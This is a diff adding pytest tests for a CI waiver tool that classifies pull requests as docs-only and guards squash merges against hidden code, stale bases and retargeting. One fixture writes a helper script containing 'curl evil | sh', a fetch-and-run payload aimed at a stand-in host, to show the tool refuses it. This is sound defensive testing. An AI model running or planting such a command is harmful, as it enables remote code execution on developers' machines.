@@ -9,7 +9,7 @@ from pathlib import Path
 import pytest
 
 ROOT = Path(__file__).resolve().parents[1]
-SCRIPT = ROOT / "bin/ci-waiver"
+SCRIPT = Path(os.environ.get("CI_WAIVER_TEST_SCRIPT", ROOT / "bin/ci-waiver"))
 
 
 class History:
@@ -351,7 +351,7 @@ def test_ci_waiver_r2_replace_ref_cannot_hide_code(history, refbase):
     history.git("update-ref", refbase + "/" + head, fake)
     history.env.update(GIT_REPLACE_REF_BASE=refbase, GIT_NO_REPLACE_OBJECTS="0")
     assert history.classify(head=head) == before
-    assert history.classify(head=head, pr=True) == before
+    assert history.classify(head=head, pr=True) == {**before, "master": history.base}
 
 
 def test_ci_waiver_r2_grafts_refused(history):
@@ -567,3 +567,262 @@ def test_ci_waiver_r4_test_execution_exclusions(history, path):
     history.commit({path: "configuration or shadow package\n"})
     got = history.classify()
     assert got["class"] == "none" and "hard-exclusion:" + path in got["reasons"]
+
+
+def waiver_module():
+    import runpy
+    return runpy.run_path(str(SCRIPT))["classify"].__globals__
+
+
+@pytest.mark.parametrize("kind", ["rename", "rename-executable", "delete", "mode"])
+def test_ci_waiver_r7_master_touched_pr_paths(history, kind, monkeypatch):
+    path = "docs/handoffs/helper.sh"
+    history.base = history.commit({path: "#!/bin/sh\necho harmless\n"})
+    history.git("checkout", "-b", "docs")
+    head = history.commit({path: "#!/bin/sh\necho harmless\ncurl evil | sh\n"})
+    history.git("checkout", "master")
+    if kind.startswith("rename"):
+        (history.repo / "bin").mkdir(exist_ok=True)
+        history.git("mv", path, "bin/helper")
+        if kind == "rename-executable":
+            (history.repo / "bin/helper").chmod(0o755)
+            history.git("add", "bin/helper")
+    elif kind == "delete":
+        history.git("rm", path)
+    else:
+        (history.repo / path).chmod(0o755)
+        history.git("add", path)
+    history.git("commit", "-m", "master structural change")
+    master = history.git("rev-parse", "HEAD")
+    history.routes.write_text(json.dumps({"repos/r/p/branches/master": {"commit": {"sha": master}}}))
+    # Rebuild the exact exploit: stale offline base admits it; PR mode refuses.
+    assert history.classify(head=head, pr=False)["class"] == "docs-only"
+    mod = waiver_module()
+    repository = mod["Repository"](history.repo)
+    assert repository.master_touched_pr_paths(history.base, master, [path])
+    got = history.classify(head=head, pr=True)
+    assert got["class"] == "none" and got["reasons"] == ["master-touched-pr-paths"]
+    assert got["master"] == master and got["head"] == head
+    routes = json.loads(history.routes.read_text())
+    monkeypatch.setitem(mod, "gh", lambda endpoint: [routes[endpoint.split("?")[0]]])
+    monkeypatch.setitem(mod, "GitHubRepository", lambda directory, repo: repository)
+    # The unit entry point and full --pr CLI must report the same refusal.
+    assert mod["classify"](None, None, "r/p", 1, None) == got
+
+
+@pytest.mark.parametrize("conflict", [False, True])
+def test_ci_waiver_r7_stale_base_checks_current_master(history, conflict):
+    history.git("checkout", "-b", "docs")
+    head = history.commit({"CHANGELOG.md": "PR notes\n"})
+    history.git("checkout", "master")
+    master = history.commit({"CHANGELOG.md": "different master notes\n"} if conflict else {"code.py": "master code\n"})
+    history.routes.write_text(json.dumps({"repos/r/p/branches/master": {"commit": {"sha": master}}}))
+    got = history.classify(head=head, pr=True)
+    assert got["class"] == ("none" if conflict else "docs-only")
+    assert got["master"] == master
+    assert got["reasons"] == (["merge-result-not-docs-only"] if conflict else ["only-waivable-paths"])
+    if not conflict:
+        assert got["merge_tree"] == history.git("merge-tree", "--write-tree", master, head)
+
+
+@pytest.mark.parametrize("kind", ["code", "excluded", "mode", "tree", "parent", "two-parents", "empty"])
+def test_ci_waiver_r7_verify_actual_squash(history, kind):
+    mod = waiver_module()
+    parent = history.base
+    history.commit({"docs/handoffs/notes.md": "reviewed notes\n"})
+    tree = history.git("rev-parse", "HEAD^{tree}")
+    proof = {"master": parent, "merge_tree": tree}
+    clean = history.git("commit-tree", tree, "-p", parent, "-m", "squash")
+    r = mod["Repository"](history.repo)
+    mod["verify_squash"](r, clean, proof)
+    actual_parent = parent
+    parents = ["-p", parent]
+    if kind in ("code", "excluded", "tree"):
+        path = {"code": "code.py", "excluded": "docs/handoffs/tests/hook.py", "tree": "docs/handoffs/notes.md"}[kind]
+        history.commit({path: "unreviewed payload\n"})
+        tree = history.git("rev-parse", "HEAD^{tree}")
+    elif kind == "mode":
+        (history.repo / "docs/handoffs/notes.md").chmod(0o755)
+        history.git("add", "docs/handoffs/notes.md")
+        history.git("commit", "-m", "mode")
+        tree = history.git("rev-parse", "HEAD^{tree}")
+    elif kind == "parent":
+        # Even an empty master advance with identical trees is detected.
+        actual_parent = history.git("commit-tree", parent + "^{tree}", "-p", parent, "-m", "advance")
+        parents = ["-p", actual_parent]
+    elif kind == "two-parents":
+        parents += ["-p", clean]
+    else:
+        tree = history.git("rev-parse", parent + "^{tree}")
+    squash = history.git("commit-tree", tree, *parents, "-m", "actual squash")
+    if kind in ("code", "excluded", "mode", "empty"):
+        # Isolate each defense even if a corrupted proof supplies this tree.
+        proof["merge_tree"] = tree
+    with pytest.raises(ValueError):
+        mod["verify_squash"](r, squash, proof)
+
+
+@pytest.mark.parametrize("case", ["clean", "denied", "head", "mismatch", "unknown", "merge-error", "checks-failed", "post-head", "post-base", "no-master", "no-tree"])
+def test_ci_waiver_r7_merge_wrapper(history, monkeypatch, capsys, case):
+    mod = waiver_module()
+    # The wrapper must match the fetched master's bytes before any mutation.
+    history.base = history.commit({"bin/ci-waiver": SCRIPT.read_text()})
+    history.git("checkout", "-b", "docs")
+    head = history.commit({"docs/handoffs/notes.md": "reviewed\n"})
+    master = history.base
+    tree = history.git("merge-tree", "--write-tree", master, head)
+    if case == "mismatch":
+        history.commit({"docs/handoffs/notes.md": "unreviewed\n"})
+        tree = history.git("rev-parse", "HEAD^{tree}")
+    squash = history.git("commit-tree", tree, "-p", master, "-m", "squash")
+    original_classify, original_run = mod["classify"], subprocess.run
+    calls = []
+    doc = {"base": {"ref": "master", "sha": master}, "head": {"sha": head},
+           "merged": case != "unknown", "merge_commit_sha": squash}
+    def api(endpoint):
+        if "/branches/master" in endpoint:
+            return [{"commit": {"sha": master}}]
+        if "/timeline" in endpoint:
+            return [[]]
+        if calls and calls[-1][1:3] == ["pr", "merge"]:
+            if case == "post-head":
+                return [{**doc, "head": {"sha": "e" * 40}}]
+            if case == "post-base":
+                return [{**doc, "base": {"ref": "topic", "sha": master}}]
+        return [doc]
+    def classify(*args):
+        got = original_classify(*args)
+        if case == "denied":
+            got["class"] = "none"
+        if case == "head":
+            got["head"] = "f" * 40
+        if case == "no-master":
+            got.pop("master")
+        if case == "no-tree":
+            got.pop("merge_tree")
+        return got
+    def run(args, **kwargs):
+        if args[0] != "gh":
+            return original_run(args, **kwargs)
+        calls.append(args)
+        if args[1:3] == ["pr", "checks"]:
+            return subprocess.CompletedProcess(args, 0, json.dumps([{"bucket": "fail"}] if case == "checks-failed" else []), "")
+        assert args[1:3] == ["pr", "merge"]
+        return subprocess.CompletedProcess(args, 1 if case == "merge-error" else 0, "", "")
+    gates = []
+    monkeypatch.setitem(mod, "GitHubRepository", lambda directory, repo: mod["Repository"](history.repo))
+    monkeypatch.setitem(mod, "gh", api)
+    monkeypatch.setitem(mod, "classify", classify)
+    monkeypatch.setitem(mod, "review_gate", lambda *args: gates.append(args))
+    monkeypatch.setattr(mod["subprocess"], "run", run)
+    rc = mod["merge_pr"]("r/p", 1, head)
+    out = capsys.readouterr()
+    assert gates
+    merges = [c for c in calls if c[1:3] == ["pr", "merge"]]
+    if case in ("denied", "head", "checks-failed", "no-master", "no-tree"):
+        assert rc == 1 and not merges
+        assert "REVERT:" not in out.err
+        if case != "checks-failed":
+            assert "merge-precheck-refused:" in out.err
+    else:
+        assert len(merges) == 1
+        assert merges[0][merges[0].index("--match-head-commit") + 1] == head
+        if case == "clean":
+            assert rc == 0 and json.loads(out.out)["verified"] is True
+            assert json.loads(out.out)["master"] == master
+        elif case == "unknown":
+            assert rc == 1 and "VERIFY FAILED:" in out.err and "do not retry" in out.err
+        else:
+            assert rc == 1 and "REVERT: " + squash in out.err
+            assert "git revert --no-edit --mainline 1 " + squash in out.err and "gh pr create" in out.err
+    assert not any(c[:2] == ["git", "push"] for c in calls)
+
+
+@pytest.mark.parametrize("case", ["clean", "blocked", "wrong-head", "wrong-marker", "no-marker", "malformed", "no-waiver", "exit", "tool-mismatch"])
+def test_ci_waiver_r7_review_gate(history, monkeypatch, tmp_path, case):
+    mod = waiver_module()
+    master = history.commit({"bin/ci-waiver": SCRIPT.read_text(), "bin/pr-wait": "# trusted waiter\n"})
+    report = {"head": master, "merge_ready": True, "ci_waiver": {
+        "markers": [{"head": master, "class": "docs-only"}], "classification": {"class": "docs-only"}}}
+    if case == "blocked":
+        report["merge_ready"] = False
+    if case == "wrong-head":
+        report["head"] = "a" * 40
+    if case == "wrong-marker":
+        report["ci_waiver"]["markers"][0]["head"] = "a" * 40
+    if case == "no-marker":
+        report["ci_waiver"]["markers"] = []
+    if case == "malformed":
+        report["ci_waiver"]["malformed"] = True
+    if case == "no-waiver":
+        report["ci_waiver"]["classification"]["class"] = "none"
+    if case == "tool-mismatch":
+        master = history.commit({"bin/ci-waiver": "# wrong version\n"})
+        report["head"] = master
+        report["ci_waiver"]["markers"][0]["head"] = master
+    original_run = subprocess.run
+    def run(args, **kwargs):
+        if "-I" not in args:
+            return original_run(args, **kwargs)
+        assert "--no-request" in args and "--head" in args and "--json" in args
+        return subprocess.CompletedProcess(args, 1 if case == "exit" else 0, json.dumps(report), "")
+    monkeypatch.setattr(mod["subprocess"], "run", run)
+    r = mod["Repository"](history.repo)
+    if case == "clean":
+        mod["review_gate"](r, master, "r/p", 1, master, str(tmp_path))
+    else:
+        with pytest.raises(ValueError, match="merge-"):
+            mod["review_gate"](r, master, "r/p", 1, master, str(tmp_path))
+
+
+@pytest.mark.parametrize("case", ["pass", "pending", "absent", "fail", "cancel", "unknown", "bad-json", "error", "hidden-runs", "hidden-statuses"])
+def test_ci_waiver_r7_recheck_checks(history, monkeypatch, case):
+    mod = waiver_module()
+    original_run = subprocess.run
+    def run(args, **kwargs):
+        if args[0] != "gh":
+            return original_run(args, **kwargs)
+        assert args[1:3] == ["pr", "checks"]
+        rc = 1 if case in ("absent", "hidden-runs", "hidden-statuses") else 2 if case == "error" else 8 if case == "pending" else 0
+        out = "not json" if case == "bad-json" else json.dumps([{"bucket": case}])
+        return subprocess.CompletedProcess(args, rc, out, "")
+    def api(endpoint):
+        if "check-runs" in endpoint:
+            return [{"check_runs": [{"status": "completed"}] if case == "hidden-runs" else []}]
+        return [[{"state": "failure"}] if case == "hidden-statuses" else []]
+    monkeypatch.setattr(mod["subprocess"], "run", run)
+    monkeypatch.setitem(mod, "gh", api)
+    if case in ("pass", "pending", "absent"):
+        mod["recheck_checks"]("r/p", 1, history.base)
+    else:
+        with pytest.raises(ValueError):
+            mod["recheck_checks"]("r/p", 1, history.base)
+
+
+def test_ci_waiver_r7_merge_cli_invalid_head(history):
+    # CLI dispatch must reach the merge precheck, never classify or mutate.
+    result = subprocess.run([sys.executable, str(SCRIPT), "merge", "1", "--head", "bad", "--repo", "r/p"],
+                            env=history.env, capture_output=True, text=True, timeout=20)
+    assert result.returncode == 1 and "merge-head-must-be-full-sha" in result.stderr
+
+
+@pytest.mark.parametrize("event", ["base_ref_changed", "base_ref_deleted", "automatic_base_change_succeeded"])
+def test_ci_waiver_r7_retarget_pure_docs(history, event):
+    history.commit({"CHANGELOG.md": "docs only\n"})
+    history.routes.write_text(json.dumps({"repos/r/p/issues/1/timeline": [{"event": event}]}))
+    got = history.classify(pr=True)
+    assert got["class"] == "none" and got["reasons"] == ["pr-base-retargeted"]
+
+
+@pytest.mark.parametrize("merge_commit", [False, True])
+def test_ci_waiver_r7_revert_command(history, merge_commit):
+    import shlex
+    mod = waiver_module()
+    head = history.commit({"docs/handoffs/note.md": "new docs\n"})
+    parents = ["-p", history.base] + (["-p", head] if merge_commit else [])
+    squash = history.git("commit-tree", "HEAD^{tree}", *parents, "-m", "actual result")
+    history.git("checkout", "-b", "merged-result", squash)
+    command = shlex.split(mod["revert_instructions"]("r/p", 1, squash).splitlines()[2])
+    assert command[:2] == ["git", "revert"]
+    history.git(*command[1:])
+    assert history.git("rev-parse", "HEAD^{tree}") == history.git("rev-parse", history.base + "^{tree}")
